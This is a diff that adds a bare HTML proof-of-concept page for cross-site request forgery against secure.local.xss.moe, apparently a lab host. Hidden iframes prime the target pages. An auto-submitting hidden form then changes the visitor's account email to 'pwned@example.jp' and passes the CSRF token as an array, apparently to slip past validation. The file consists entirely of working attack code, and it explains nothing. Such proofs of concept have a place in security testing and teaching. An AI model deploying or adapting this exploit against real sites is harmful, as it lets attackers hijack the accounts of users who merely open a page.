@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>PoC</title>
+</head>
+<body>
+  <iframe id="frame1" src="//secure.local.xss.moe/mypage.php" style="display:none"></iframe>
+  <iframe id="frame2" style="display:none"></iframe>
+  <form id="form" method="POST" action="//secure.local.xss.moe/chgmail.php">
+    <input type="hidden" name="mail" value="pwned@example.jp">
+    <input type="hidden" name="token[]" value="whatever">
+  </form>
+  <script>
+    let frame1 = document.getElementById('frame1');
+    let frame2 = document.getElementById('frame2');
+
+    frame1.addEventListener('load', (e) => {
+      frame2.src = '//secure.local.xss.moe/chgmailform.php';
+    });
+
+    frame2.addEventListener('load', (e) => {
+      let form = document.getElementById('form');
+      form.submit();
+    });
+  </script>
+</body>
+</html>
